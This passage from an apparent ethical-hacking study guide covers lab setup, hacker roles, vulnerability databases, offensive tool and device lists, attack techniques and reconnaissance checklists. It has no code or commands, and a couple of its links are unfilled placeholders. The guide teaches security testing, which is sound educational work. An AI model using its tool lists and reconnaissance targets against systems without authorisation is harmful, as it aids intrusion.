</li>
</ul>
<h2 id="documentation"><a class="header" href="#documentation">Documentation</a></h2>
<ul>
<li>Keep detailed notes and documentation of your lab setup, configurations, and findings. This is crucial for learning and reference.</li>
</ul>
<h2 id="continuous-learning"><a class="header" href="#continuous-learning">Continuous Learning</a></h2>
<ul>
<li>Stay updated with the latest ethical hacking techniques, tools, and methodologies. Join online forums, communities, and attend training courses.</li>
</ul>
<h2 id="legal-and-ethical-considerations"><a class="header" href="#legal-and-ethical-considerations">Legal and Ethical Considerations</a></h2>
<ul>
<li>Understand the legal and ethical responsibilities of ethical hacking. Never attempt any activities without proper authorization and consent.</li>
</ul>
<h2 id="security"><a class="header" href="#security">Security</a></h2>
<ul>
<li>Ensure that your lab environment is properly secured. Change default passwords, use strong authentication, and restrict access to your lab.</li>
</ul>
<p>By following these steps, you can create a safe and effective environment for practicing ethical hacking techniques and improving your cybersecurity skills responsibly.</p>
<h1 id="hackers-team-membership"><a class="header" href="#hackers-team-membership">Hacker's Team Membership</a></h1>
<p>If you're exploring the world of hacking and cybersecurity, you may encounter various team memberships, each with its own roles and responsibilities. Here's a list of common hacker team memberships:</p>
<h2 id="1-programmer"><a class="header" href="#1-programmer">1. Programmer</a></h2>
<ul>
<li>Skilled in coding and scripting, often used to develop tools and scripts for hacking.</li>
</ul>
<h2 id="2-cracker"><a class="header" href="#2-cracker">2. Cracker</a></h2>
<ul>
<li>Focuses on breaking software protections, such as cracking software licenses or copy protection.</li>
</ul>
<h2 id="3-defacer"><a class="header" href="#3-defacer">3. Defacer</a></h2>
<ul>
<li>Specializes in altering the appearance of websites by replacing their content with their own messages.</li>
</ul>
<h2 id="4-carder"><a class="header" href="#4-carder">4. Carder</a></h2>
<ul>
<li>Engages in credit card fraud and unauthorized financial transactions.</li>
</ul>
<h2 id="5-bug-hunter"><a class="header" href="#5-bug-hunter">5. Bug Hunter</a></h2>
<ul>
<li>Searches for and reports software vulnerabilities to help improve security.</li>
</ul>
<h2 id="6-ctf-player-capture-the-flag"><a class="header" href="#6-ctf-player-capture-the-flag">6. CTF Player (Capture The Flag)</a></h2>
<ul>
<li>Enjoys solving hacking challenges and puzzles in Capture The Flag competitions.</li>
</ul>
<h2 id="7-spammer"><a class="header" href="#7-spammer">7. Spammer</a></h2>
<ul>
<li>Sends unsolicited emails or messages in large volumes, often for malicious purposes.</li>
</ul>
<h2 id="8-black-hat"><a class="header" href="#8-black-hat">8. Black Hat</a></h2>
<ul>
<li>Engages in malicious and illegal hacking activities with criminal intent.</li>
</ul>
<h2 id="9-white-hat"><a class="header" href="#9-white-hat">9. White Hat</a></h2>
<ul>
<li>Ethical hacker who legally identifies and fixes security vulnerabilities to enhance cybersecurity.</li>
</ul>
<h2 id="10-gray-hat"><a class="header" href="#10-gray-hat">10. Gray Hat</a></h2>
<ul>
<li>Operates in a morally ambiguous space, conducting hacking activities without explicit authorization but without malicious intent.</li>
</ul>
<h2 id="11-developer"><a class="header" href="#11-developer">11. Developer</a></h2>
<ul>
<li>Creates software and tools, often used by hackers to automate tasks or exploit vulnerabilities.</li>
</ul>
<h2 id="12-beta-crew"><a class="header" href="#12-beta-crew">12. Beta Crew</a></h2>
<ul>
<li>Testers who evaluate new hacking tools and techniques before wider release.</li>
</ul>
<h2 id="13-crew-member"><a class="header" href="#13-crew-member">13. Crew Member</a></h2>
<ul>
<li>A member of a hacking group or crew.</li>
</ul>
<h2 id="14-zone-admin"><a class="header" href="#14-zone-admin">14. Zone Admin</a></h2>
<ul>
<li>Manages specific areas or zones on a network, often responsible for security.</li>
</ul>
<h2 id="15-admin"><a class="header" href="#15-admin">15. Admin</a></h2>
<ul>
<li>Has administrative privileges, often within a hacker forum or system.</li>
</ul>
<h2 id="16-ceo-chief-executive-officer"><a class="header" href="#16-ceo-chief-executive-officer">16. CEO (Chief Executive Officer)</a></h2>
<ul>
<li>The leader or top authority figure within a hacking group or organization.</li>
</ul>
<p>These team memberships reflect the diverse roles and responsibilities within the world of hacking and cybersecurity. Keep in mind that ethical considerations and legal boundaries should always be respected in any hacking activity.</p>
<h1 id="freelancing-in-cybersecurity"><a class="header" href="#freelancing-in-cybersecurity">Freelancing in Cybersecurity</a></h1>
<p><img src="https://encrypted-tbn0.gstatic.com/images?q=tbn:ANd9GcQuLpJf0R4GLqEQXuZzrbXefCs53dWkDCP_-w&amp;usqp=CAU" alt="myImage" /></p>
<p>If you're passionate about cybersecurity and want to work independently, freelancing can be a rewarding career option. Here are some remote job roles and opportunities in the field:</p>
<h2 id="1-ethical-hacker"><a class="header" href="#1-ethical-hacker">1. Ethical Hacker</a></h2>
<ul>
<li><strong>Role:</strong> Ethical hackers, also known as white-hat hackers, use their skills to identify and fix security vulnerabilities.</li>
<li><strong>Freelancing Opportunity:</strong> Offer your services to organizations looking to assess and enhance their cybersecurity.</li>
</ul>
<h2 id="2-white-hat-hacker"><a class="header" href="#2-white-hat-hacker">2. White Hat Hacker</a></h2>
<ul>
<li><strong>Role:</strong> Similar to ethical hackers, white-hat hackers focus on security testing and vulnerability assessment.</li>
<li><strong>Freelancing Opportunity:</strong> Provide penetration testing and security consulting services to clients remotely.</li>
</ul>
<h2 id="3-cybersecurity-expertspecialist"><a class="header" href="#3-cybersecurity-expertspecialist">3. Cybersecurity Expert/Specialist</a></h2>
<ul>
<li><strong>Role:</strong> Cybersecurity experts are well-versed in various aspects of cybersecurity, from threat analysis to risk management.</li>
<li><strong>Freelancing Opportunity:</strong> Offer expertise in cybersecurity strategy and implementation to businesses seeking protection.</li>
</ul>
<h2 id="4-bug-bounty-hunter"><a class="header" href="#4-bug-bounty-hunter">4. Bug Bounty Hunter</a></h2>
<ul>
<li><strong>Role:</strong> Bug bounty hunters actively seek and report security vulnerabilities in software and websites.</li>
<li><strong>Freelancing Opportunity:</strong> Participate in bug bounty programs offered by companies and platforms, earning rewards for finding and responsibly disclosing vulnerabilities.</li>
</ul>
<h2 id="5-pentester-penetration-tester"><a class="header" href="#5-pentester-penetration-tester">5. Pentester (Penetration Tester)</a></h2>
<ul>
<li><strong>Role:</strong> Pentesters simulate cyberattacks to identify weaknesses in a system's defenses.</li>
<li><strong>Freelancing Opportunity:</strong> Freelance pentesters are in demand for assessing and securing networks, applications, and websites.</li>
</ul>
<p>Explore these freelance opportunities in cybersecurity to leverage your skills and help organizations strengthen their digital defenses while enjoying the flexibility of remote work.</p>
<h1 id="vulnerability-scoring-systems-and-databases"><a class="header" href="#vulnerability-scoring-systems-and-databases">Vulnerability Scoring Systems and Databases</a></h1>
<p><img src="https://encrypted-tbn0.gstatic.com/images?q=tbn:ANd9GcQAHu_a9C1liAgyIb8JdR6gvCG6cZRKAT_EjQ&amp;usqp=CAU" alt="myImage" /></p>
<p>In the field of cybersecurity, vulnerability scoring systems and databases play a crucial role in identifying, categorizing, and prioritizing security vulnerabilities. Here are some prominent ones:</p>
<h2 id="common-vulnerability-scoring-system-cvss"><a class="header" href="#common-vulnerability-scoring-system-cvss">Common Vulnerability Scoring System (CVSS)</a></h2>
<ul>
<li><strong>Description:</strong> CVSS is a standardized system for assessing the severity and potential impact of security vulnerabilities.</li>
<li><strong>Use:</strong> It assigns a numeric score to vulnerabilities, helping organizations prioritize and address them based on their criticality.</li>
<li><strong>Website:</strong> <a href="https://www.first.org/cvss/">CVSS Official Website</a></li>
</ul>
<h2 id="common-vulnerabilities-and-exposures-cve"><a class="header" href="#common-vulnerabilities-and-exposures-cve">Common Vulnerabilities and Exposures (CVE)</a></h2>
<ul>
<li><strong>Description:</strong> CVE is a dictionary of publicly known information security vulnerabilities and exposures.</li>
<li><strong>Use:</strong> Each CVE entry provides a unique identifier for a vulnerability, making it easier to track and reference vulnerabilities across the cybersecurity community.</li>
<li><strong>Website:</strong> <a href="https://cve.mitre.org/">CVE Official Website</a></li>
</ul>
<h2 id="national-vulnerability-database-nvd"><a class="header" href="#national-vulnerability-database-nvd">National Vulnerability Database (NVD)</a></h2>
<ul>
<li><strong>Description:</strong> NVD is the U.S. government repository of standards-based vulnerability management data.</li>
<li><strong>Use:</strong> It provides a comprehensive database of vulnerabilities, including CVSS scores, making it a valuable resource for security professionals.</li>
<li><strong>Website:</strong> <a href="https://nvd.nist.gov/">NVD Official Website</a></li>
</ul>
<h2 id="common-weakness-enumeration-cwe"><a class="header" href="#common-weakness-enumeration-cwe">Common Weakness Enumeration (CWE)</a></h2>
<ul>
<li><strong>Description:</strong> CWE is a community-developed list of common software weaknesses.</li>
<li><strong>Use:</strong> It helps identify vulnerabilities and design flaws in software by providing a standardized language for discussing security weaknesses.</li>
<li><strong>Website:</strong> <a href="https://cwe.mitre.org/">CWE Official Website</a></li>
</ul>
<p>These vulnerability scoring systems and databases are essential tools for cybersecurity professionals and organizations to stay informed about vulnerabilities, assess their severity, and take appropriate measures to secure their systems and data.</p>
<h1 id="want-to-become-an-ethical-hacker"><a class="header" href="#want-to-become-an-ethical-hacker">Want to Become an Ethical Hacker?</a></h1>
<h2 id="একজন-হযাকারের-যা-জানা-থাকা-দরকার"><a class="header" href="#একজন-হযাকারের-যা-জানা-থাকা-দরকার">একজন হ্যাকারের যা জানা থাকা দরকার</a></h2>
<p><img src="https://encrypted-tbn0.gstatic.com/images?q=tbn:ANd9GcSDUgkB5-OkFW2OJrf0KrPM9d8SEdzNspDWjA&amp;usqp=CAU" alt="myImage" /></p>
<p>If you aspire to become an ethical hacker, there are essential skills and knowledge areas you need to focus on:</p>
<ol>
<li>
<p><strong>Programming is Important!</strong></p>
<ul>
<li>Programming languages like Python, JavaScript, and C/C++ are essential for creating tools, scripts, and understanding the inner workings of software.</li>
</ul>
</li>
<li>
<p><strong>Have a Hacker's Mindset</strong></p>
<ul>
<li>Think like a hacker by exploring systems, seeking vulnerabilities, and understanding how things can be exploited.</li>
</ul>
</li>
<li>
<p><strong>Be Verbose, But Don't Talk Much</strong></p>
<ul>
<li>Effective communication is crucial. Document your findings and share them with your team, but avoid revealing too much publicly.</li>
</ul>
</li>
<li>
<p><strong>Logical Thinking</strong></p>
<ul>
<li>Develop strong problem-solving skills and the ability to think logically to uncover vulnerabilities and devise secure solutions.</li>
</ul>
</li>
<li>
<p><strong>Don't Learn It All, But Know It All</strong></p>
<ul>
<li>Cybersecurity is a vast field. Focus on mastering specific areas like network security, web application security, or penetration testing.</li>
</ul>
</li>
<li>
<p><strong>Computer Basics: Hardware, Software, Processing Methodology</strong></p>
<ul>
<li>Understand the fundamentals of computer hardware, software, and how data processing works.</li>
</ul>
</li>
<li>
<p><strong>Web and Internet</strong></p>
<ul>
<li>Learn about protocols like HTTP, DNS, Web Servers, FTP, and SMTP to understand web technologies and potential attack vectors.</li>
</ul>
</li>
<li>
<p><strong>Networking</strong></p>
<ul>
<li>Master TCP/IP, ARP, network devices, types of networks, and routing and switching concepts for comprehensive network security.</li>
</ul>
</li>
<li>
<p><strong>Operating Systems</strong></p>
<ul>
<li>Familiarize yourself with various operating systems, including Linux distributions (e.g., Kali, Parrot, Red Hat), Windows, Android, iOS, and macOS.</li>
</ul>
</li>
</ol>
<p>Embarking on a journey to become an ethical hacker requires dedication and continuous learning. Start with the basics, build a strong foundation, and gradually specialize in areas that align with your interests and career goals.</p>
<p>Remember that ethical hacking is about safeguarding systems and data, so always prioritize ethical conduct and respect legal boundaries in your cybersecurity endeavors.</p>
<h1 id="some-very-common-hacking-tools"><a class="header" href="#some-very-common-hacking-tools">Some Very Common Hacking Tools</a></h1>
<p><img src="https://encrypted-tbn0.gstatic.com/images?q=tbn:ANd9GcSF81vFph0pylN-H9VFUoyA0UDP0VFb89CeSA&amp;usqp=CAU" alt="myImage" /></p>
<p>Here are some widely used hacking tools that security professionals and ethical hackers employ for various cybersecurity tasks:</p>
<ol>
<li>
<p><strong>Nessus Vulnerability Scanner</strong></p>
<ul>
<li>A network vulnerability scanner that detects security flaws in a wide range of systems and applications.</li>
</ul>
</li>
<li>
<p><strong>Kismet</strong></p>
<ul>
<li>A wireless network analyzer that monitors wireless network traffic to identify potential security issues.</li>
</ul>
</li>
<li>
<p><strong>John The Ripper</strong></p>
<ul>
<li>A password cracking tool capable of cracking Unix, Windows, and encrypted passwords.</li>
</ul>
</li>
<li>
<p><strong>Unicornscan</strong></p>
<ul>
<li>A fast and lightweight network scanner that identifies open ports, service versions, and network information.</li>
</ul>
</li>
<li>
<p><strong>Netsparker</strong></p>
<ul>
<li>A web application vulnerability scanner used to identify vulnerabilities in websites and web applications.</li>
</ul>
</li>
<li>
<p><strong>Burp Suite</strong></p>
<ul>
<li>A comprehensive web application security testing tool, including scanning, crawling, and application attack testing.</li>
</ul>
</li>
<li>
<p><strong>Sqlmap</strong></p>
<ul>
<li>Detects and exploits SQL injection vulnerabilities in web applications.</li>
</ul>
</li>
<li>
<p><strong>Nikto Website Vulnerability Scanner</strong></p>
<ul>
<li>Scans web servers for vulnerabilities and security issues.</li>
</ul>
</li>
<li>
<p><strong>SuperScan</strong></p>
<ul>
<li>A powerful network scanner that detects open ports, vulnerabilities, and network information.</li>
</ul>
</li>
<li>
<p><strong>Metasploit</strong></p>
<ul>
<li>A penetration testing framework for identifying and exploiting vulnerabilities in various systems and applications.</li>
</ul>
</li>
<li>
<p><strong>Nmap</strong></p>
<ul>
<li>A comprehensive network scanner that identifies open ports, vulnerabilities, and network information.</li>
</ul>
</li>
<li>
<p><strong>Aircrack-ng</strong></p>
<ul>
<li>Used to crack Wi-Fi network authentication keys.</li>
</ul>
</li>
<li>
<p><strong>Acunetix</strong></p>
<ul>
<li>A web application security scanner that identifies vulnerabilities and security issues in websites and web applications.</li>
</ul>
</li>
<li>
<p><strong>Wireshark</strong></p>
<ul>
<li>A network protocol analyzer for troubleshooting network issues and detecting security threats.</li>
</ul>
</li>
<li>
<p><strong>Hashcat</strong></p>
<ul>
<li>A password cracking tool supporting a wide range of password types and hash algorithms.</li>
</ul>
</li>
<li>
<p><strong>Maltego</strong></p>
<ul>
<li>Software for open-source intelligence and forensic analysis of threat actors.</li>
</ul>
</li>
<li>
<p><strong>Social-Engineer Toolkit</strong></p>
<ul>
<li>Used for performing social engineering attacks, such as phishing and spear-phishing.</li>
</ul>
</li>
</ol>
<p>These tools are essential for cybersecurity professionals to identify vulnerabilities, assess security risks, and enhance the overall security posture of systems and networks.</p>
<h1 id="common-hacking-techniques"><a class="header" href="#common-hacking-techniques">Common Hacking Techniques</a></h1>
<p><img src="https://encrypted-tbn0.gstatic.com/images?q=tbn:ANd9GcRF7O9dHvmXsntwYTcD_z6jCSpgnMlyJ6vtpw&amp;usqp=CAU" alt="myImage" /></p>
<p>In the world of cybersecurity, understanding common hacking techniques is essential for identifying vulnerabilities and protecting against cyber threats. Here are some widely used hacking techniques:</p>
<ol>
<li>
<p><strong>Phishing</strong></p>
<ul>
<li>Description: Trick users into revealing sensitive information (e.g., passwords, credit card details) by posing as a trustworthy entity in electronic communication.</li>
</ul>
</li>
<li>
<p><strong>Malware</strong></p>
<ul>
<li>Description: Software designed to gain unauthorized access or cause damage to a computer system.</li>
</ul>
</li>
<li>
<p><strong>Keylogger</strong></p>
<ul>
<li>Description: Malware that records keystrokes, potentially stealing sensitive information like passwords and credit card numbers.</li>
</ul>
</li>
<li>
<p><strong>Cross-Site Scripting (XSS)</strong></p>
<ul>
<li>Description: Exploits vulnerabilities in web applications to inject malicious code into web pages, compromising user data and server security.</li>
</ul>
</li>
<li>
<p><strong>SQL Injection (SQLi)</strong></p>
<ul>
<li>Description: Exploits database vulnerabilities in web applications, allowing attackers to inject SQL commands and steal sensitive data.</li>
</ul>
</li>
<li>
<p><strong>Denial of Service (DoS) / Distributed Denial of Service (DDoS) Attacks</strong></p>
<ul>
<li>Description: Overwhelm a system or network to make it unavailable to users, often by flooding it with traffic.</li>
</ul>
</li>
<li>
<p><strong>Social Engineering</strong></p>
<ul>
<li>Description: Manipulating individuals to divulge sensitive information, data, or access to a system or network.</li>
</ul>
</li>
<li>
<p><strong>Card Skimming</strong></p>
<ul>
<li>Description: Installing discreet devices on ATMs to steal card data when users insert or swipe their cards.</li>
</ul>
</li>
<li>
<p><strong>ATM Hacking</strong></p>
<ul>
<li>Description: Exploiting vulnerabilities or using hardware hacks to gain unauthorized access to ATMs, stealing card data and PINs.</li>
</ul>
</li>
<li>
<p><strong>System Hacking</strong></p>
<ul>
<li>Description: Exploiting vulnerabilities in operating systems or applications to gain unauthorized access, steal data, or perform malicious actions.</li>
</ul>
</li>
<li>
<p><strong>Web Server Hacking</strong></p>
<ul>
<li>Description: Exploiting vulnerabilities in web servers to gain unauthorized access, steal data, or carry out other malicious activities.</li>
</ul>
</li>
<li>
<p><strong>Cryptography</strong></p>
<ul>
<li>Description: Securing communication by converting data into an unreadable format that can't be easily intercepted or understood by unauthorized persons.</li>
</ul>
</li>
<li>
<p><strong>Sniffing</strong></p>
<ul>
<li>Description: Intercepting and monitoring network traffic to steal sensitive data, such as passwords and other transmitted information.</li>
</ul>
</li>
<li>
<p><strong>Session Hijacking</strong></p>
<ul>
<li>Description: Taking control of an active user session in a web application, allowing attackers to access restricted areas, steal data, or perform fraudulent actions.</li>
</ul>
</li>
</ol>
<p>Understanding these hacking techniques is crucial for safeguarding systems, networks, and sensitive data against cyber threats and attacks.</p>
<h1 id="hacking-devices"><a class="header" href="#hacking-devices">Hacking Devices</a></h1>
<p><img src="https://encrypted-tbn0.gstatic.com/images?q=tbn:ANd9GcQxZyBK5ndghRxzlAXeZ8lSgCQNxD0yEA8B7w&amp;usqp=CAU" alt="myImage" /></p>
<p>In the realm of cybersecurity, various hacking devices are employed for research, penetration testing, and security analysis. These devices have diverse applications, from identifying vulnerabilities to testing system resilience. Here are some notable hacking devices:</p>
<ol>
<li>
<p><strong>USB Rubber Ducky</strong></p>
<ul>
<li>Description: A small USB device for automated keystroke injection attacks. It emulates a keyboard and executes programmed sequences of commands.</li>
</ul>
</li>
<li>
<p><strong>Raspberry Pi</strong></p>
<ul>
<li>Description: A low-cost, versatile, credit card-sized computer used for penetration testing, network monitoring, and data privacy.</li>
</ul>
</li>
<li>
<p><strong>HackRF One</strong></p>
<ul>
<li>Description: An open-source software-defined radio platform that enables analysis and emulation of various wireless protocols like Bluetooth, FM radio, and GSM.</li>
</ul>
</li>
<li>
<p><strong>USB Killer</strong></p>
<ul>
<li>Description: A malicious USB device that delivers a high-voltage electrical surge to test the durability and security of electrical devices.</li>
</ul>
</li>
<li>
<p><strong>Proxmark3 Kit</strong></p>
<ul>
<li>Description: A tool for RFID research and attacks, capable of interacting with, reading, and cloning RFID cards and tags.</li>
</ul>
</li>
<li>
<p><strong>WiFi Pineapple</strong></p>
<ul>
<li>Description: A device for wireless penetration testing and reconnaissance, used to create fake Wi-Fi access points, collect client-side information, and perform man-in-the-middle attacks.</li>
</ul>
</li>
<li>
<p><strong>Hardware Keylogger</strong></p>
<ul>
<li>Description: A small device attached to a keyboard to record keystrokes. Useful for monitoring user activity and security testing.</li>
</ul>
</li>
<li>
<p><strong>Alfa Network Board</strong></p>
<ul>
<li>Description: A wireless network adapter for wireless penetration testing, network analysis, and reconnaissance, often used to capture packets and perform wireless attacks.</li>
</ul>
</li>
</ol>
<p>These hacking devices are indispensable tools for cybersecurity professionals, penetration testers, and researchers. They enable comprehensive assessments and analysis of systems, networks, and components to uncover vulnerabilities and weaknesses. It's crucial to use them responsibly, respecting privacy and safety considerations.</p>
<h1 id="hacker-lab-setup"><a class="header" href="#hacker-lab-setup">Hacker Lab Setup</a></h1>
<p>Setting up a hacker lab with virtual machines allows you to experiment with different operating systems and software without risking your primary environment. Here's a guide on enabling virtualization and downloading essential tools for your hacker lab.</p>
<h2 id="enable-virtualization-in-windows-10"><a class="header" href="#enable-virtualization-in-windows-10">Enable Virtualization in Windows 10</a></h2>
<ul>
<li>Virtualization allows you to run virtual machines (VMs).</li>
<li>To enable it, access your BIOS/UEFI settings, look for Virtualization, and enable it.</li>
<li>Confirm that your CPU supports virtualization technology.</li>
</ul>
<h2 id="download-virtualization-software"><a class="header" href="#download-virtualization-software">Download Virtualization Software</a></h2>
<ol>
<li>
<p><strong>VMware</strong></p>
<ul>
<li><a href="https://www.vmware.com/products/workstation-pro.html">Download VMware</a></li>
</ul>
</li>
<li>
<p><strong>VirtualBox</strong></p>
<ul>
<li><a href="https://www.virtualbox.org/">Download VirtualBox</a></li>
</ul>
</li>
</ol>
<h2 id="for-mac-users"><a class="header" href="#for-mac-users">For Mac Users</a></h2>
<ul>
<li>You can use VMware or VirtualBox to set up virtual machines on macOS.</li>
</ul>
<h3 id="download-kali-linux-vmware--virtualbox"><a class="header" href="#download-kali-linux-vmware--virtualbox">Download Kali Linux (VMware / VirtualBox)</a></h3>
<ul>
<li><a href="https://www.kali.org/downloads/">Kali Linux Download</a></li>
</ul>
<h3 id="download-parrot-os"><a class="header" href="#download-parrot-os">Download Parrot OS</a></h3>
<ul>
<li><a href="https://parrotsec.org/download/">Parrot Security Download</a></li>
</ul>
<h3 id="how-to-install-parrot-os-on-vmware"><a class="header" href="#how-to-install-parrot-os-on-vmware">How to Install Parrot OS on VMware</a></h3>
<ul>
<li><a href="https://www.youtube.com/watch?v=YOUR_VIDEO_LINK">Watch Installation Tutorial</a></li>
</ul>
<h2 id="windows-os"><a class="header" href="#windows-os">Windows OS</a></h2>
<h3 id="windows-sandbox"><a class="header" href="#windows-sandbox">Windows Sandbox</a></h3>
<ul>
<li>Enable Windows Sandbox by following this <a href="https://youtu.be/YOUR_VIDEO_LINK">video tutorial</a>.</li>
</ul>
<h3 id="cloud-linux-os"><a class="header" href="#cloud-linux-os">Cloud Linux OS</a></h3>
<ul>
<li>Explore Linux in the cloud using <a href="https://cloud.google.com/shell">Google Cloud Shell</a>.</li>
</ul>
<h3 id="kali-linux---online-in-the-cloud"><a class="header" href="#kali-linux---online-in-the-cloud">Kali Linux - Online in the Cloud</a></h3>
<ul>
<li>Try Kali Linux online using <a href="https://www.onworks.net/os-distributions/debian-based/free-kali-linux-online">OnWorks</a>.</li>
</ul>
<h2 id="android-vmware"><a class="header" href="#android-vmware">Android (VMware)</a></h2>
<ul>
<li>Download Android-x86 from <a href="https://www.fosshub.com/Android-x86.html">FossHub</a> or <a href="https://www.osboxes.org/android-x86/">OSBoxes</a>.</li>
<li>Follow this <a href="https://youtu.be/Pet4LZnZhDU">tutorial</a> for setup.</li>
<li><a href="https://www.youtube.com/watch?v=NdvE7c2E64&amp;t=561s">Bangla Tutorial</a> is also available.</li>
</ul>
<h2 id="android-virtualbox"><a class="header" href="#android-virtualbox">Android (VirtualBox)</a></h2>
<ul>
<li>Download Android-x86 from <a href="https://www.fosshub.com/Android-x86.html">FossHub</a> or <a href="https://www.osboxes.org/android-x86/">OSBoxes</a>.</li>
<li>Follow this <a href="https://www.youtube.com/watch?v=137iBpJniNs&amp;t=20s">tutorial</a> for setup.</li>
<li>Explore <a href="https://www.youtube.com/watch?v=NdvE7c2E64&amp;t=561s">Bangla Tutorial</a> if needed.</li>
</ul>
<h2 id="android-emulator"><a class="header" href="#android-emulator">Android Emulator</a></h2>
<ul>
<li>LDPlayer: <a href="https://www.ldplayer.net">Download LDPlayer</a></li>
<li>Noxplayer: <a href="https://www.bignox.com">Download Noxplayer</a></li>
<li>Gameloop: <a href="https://www.gameloop.com/">Download Gameloop</a></li>
</ul>
<p>Set up your hacker lab with these tools and enjoy a secure and isolated environment for cybersecurity experimentation.</p>
<div style="break-before: page; page-break-before: always;"></div><h1 id="footprinting-and-reconnaissance"><a class="header" href="#footprinting-and-reconnaissance">footprinting and reconnaissance</a></h1>
<h3 id="learning-objectives-1"><a class="header" href="#learning-objectives-1">Learning Objectives</a></h3>
<h2 id="understanding-footprinting-and-reconnaissance-in-cybersecurity"><a class="header" href="#understanding-footprinting-and-reconnaissance-in-cybersecurity">Understanding Footprinting and Reconnaissance in Cybersecurity</a></h2>
<p><strong>Introduction:</strong>
Footprinting and reconnaissance are fundamental steps in the process of information gathering. They play a crucial role in cybersecurity, ethical hacking, and competitive intelligence by providing valuable insights into a target, be it a network, organization, or individual.</p>
<p><strong>Footprinting:</strong>
Footprinting marks the initial phase of information gathering. It involves the discreet collection and analysis of data about the target without any direct interaction. The primary goal is to acquire as much relevant information as possible while avoiding detection. Passive techniques, such as examining public sources, social media profiles, domain registrations, DNS records, and web server banners, are used to build a comprehensive profile of the target. Additionally, this phase identifies potential vulnerabilities and areas of interest within the target's infrastructure.</p>
<p><strong>Reconnaissance:</strong>
Reconnaissance, also known as active information gathering or probing, follows footprinting. This phase involves actively probing the target to gather specific and detailed information. Unlike footprinting, reconnaissance is more intrusive.</p>
<p>It's important to note that while these activities are essential for security professionals to understand and protect against potential threats, they can also be used maliciously by hackers or cybercriminals. Unauthorized or malicious footprinting and reconnaissance activities are illegal and unethical, as they can lead to security breaches, data theft, or other harmful actions. Ethical hacking, also known as penetration testing, involves performing these activities with proper authorization to identify and mitigate security weaknesses.</p>
<p>In summary, footprinting and reconnaissance are crucial phases in information gathering that can be used for both legitimate security purposes and potentially malicious activities, depending on the intent and authorization of the person conducting them.</p>
<h1 id="reconnaissance-in-ethical-hacking"><a class="header" href="#reconnaissance-in-ethical-hacking">Reconnaissance in Ethical Hacking</a></h1>
<p>Reconnaissance, also known as Footprinting or Information Gathering, is a crucial stage in ethical hacking that involves gathering information about a target system or network. In this guide, we will explore the various techniques and tools used in reconnaissance to identify vulnerabilities that could be exploited.</p>
<h2 id="types-of-reconnaissance"><a class="header" href="#types-of-reconnaissance">Types of Reconnaissance</a></h2>
<p>There are two main types of reconnaissance:</p>
<h3 id="passive-reconnaissance"><a class="header" href="#passive-reconnaissance">Passive Reconnaissance</a></h3>
<p>Passive reconnaissance involves gathering information without directly interacting with the target system. This can be done through publicly available sources, such as websites and search engines.</p>
<h3 id="active-reconnaissance"><a class="header" href="#active-reconnaissance">Active Reconnaissance</a></h3>
<p>Active reconnaissance involves directly interacting with the target system. This can include techniques such as network scans and vulnerability scans and can raise the risk of detection.</p>
<h2 id="what-ethical-hackers-and-pentesters-look-for"><a class="header" href="#what-ethical-hackers-and-pentesters-look-for">What Ethical Hackers and Pentesters Look For</a></h2>
<p>Ethical hackers and pentesters look for various pieces of information during the reconnaissance phase, including:</p>
<ul>
<li>Network Information
<ul>
<li>Domain name</li>
<li>Internal Domain</li>
<li>IP Address</li>
<li>Unmonitored/private websites</li>
<li>TCP/UDP Services</li>
<li>VPN/IDS/IPS/access controls</li>
<li>VPN info</li>
<li>Phone numbers/VoIP</li>
<li>Network topology</li>
<li>Network device</li>
</ul>
</li>
<li>Operating System Information
<ul>
<li>Users and group names/info</li>
<li>Banner grabbing</li>
<li>Routing tables</li>
<li>SNMP</li>
<li>System architecture</li>
<li>Remote systems</li>
<li>System names</li>
<li>Passwords</li>
<li>Dumpster diving</li>
<li>Version</li>
<li>Patch level</li>
</ul>
</li>
<li>Organization Information
<ul>
<li>Organization website</li>
<li>Company directory</li>
<li>Employee information</li>
<li>Business structure</li>
<li>Location details</li>
<li>Comments in HTML source code</li>
<li>Security policies deployed</li>
<li>Webserver links</li>
<li>Background of organization</li>
<li>Marketing and advertising</li>
<li>Prevailing events</li>
<li>Partners</li>
<li>Phone</li>
<li>Financial information</li>
</ul>
</li>
</ul>
<h2 id="external-network-pentester"><a class="header" href="#external-network-pentester">External Network Pentester</a></h2>
<p>External network pentesters focus on evaluating the security of an organization’s external network infrastructure. They look for:</p>
<ul>
<li>Whois</li>
<li>Operating systems and applications</li>
<li>Publicly accessible information</li>
<li>Google and Search Engine</li>
<li>Website Mirroring</li>
<li>Archive Sites</li>
<li>Github recon</li>
<li>Network Information</li>
<li>Web server Content</li>
<li>Email Header</li>
<li>People Sites</li>
<li>Social Network</li>
<li>Alert Website</li>
</ul>
<h2 id="internal-network-pentester"><a class="header" href="#internal-network-pentester">Internal Network Pentester</a></h2>
<p>Internal network penetration testing focuses on evaluating the security of an organization’s internal network infrastructure. They look for:</p>
<ul>
<li>IP Address</li>
<li>Internal DNS</li>
<li>Private Website</li>
<li>Dumpster Diving</li>
<li>Shoulder Surfing</li>
</ul>
<h2 id="web-application-pentester"><a class="header" href="#web-application-pentester">Web Application Pentester</a></h2>
<p>Web application pentesters focus on evaluating the security of an organization’s web applications. They look for:</p>
<ul>
<li>Network Information
<ul>
<li>IP address</li>
<li>Domain name</li>
<li>Network topology</li>
<li>Open ports and services</li>
</ul>
</li>
<li>Web Application Information
<ul>
<li>Web server technology used</li>
<li>Application framework</li>
<li>Source code (if accessible)</li>
<li>Session management</li>
<li>Input validation and data handling</li>
<li>Authentication and authorization mechanisms</li>
</ul>
</li>
<li>Web Server Information
<ul>
<li>Operating system</li>
<li>Web server software version</li>
<li>Server-side scripting language and version</li>
<li>Database management system and version</li>
</ul>
</li>
<li>Web Application Components
<ul>
<li>
<p>Dynamic content generation</p>
</li>
<li>
<p>Client-side scripting languages</p>
</li>
<li>
<p>Third-party components and libraries</p>
<p><img src="https://github.com/masshuvo/full_ceh_guide/assets/108648096/885a1761-17c0-4f04-bd17-a96c8b6ea91d" alt="images (4)" /></p>
</li>
</ul>
</li>
</ul>
<h2 id="conclusion"><a class="header" href="#conclusion">Conclusion</a></h2>
<p>Reconnaissance is an essential stage in ethical hacking that involves gathering information about a target system or network. It helps ethical hackers and pentesters identify vulnerabilities that could be exploited. By understanding the various techniques and tools used in reconnaissance, you can enhance your skills as an ethical hacker or pentester.</p>
<h1 id="footprinting-in-cybersecurity"><a class="header" href="#footprinting-in-cybersecurity">Footprinting in Cybersecurity</a></h1>
<p>Footprinting involves gathering information about a target system that can be used to execute a successful cyber attack. To obtain this information, hackers use various methods and tools. This information serves as the initial step for the hacker to exploit a system. There are two types of footprinting:</p>
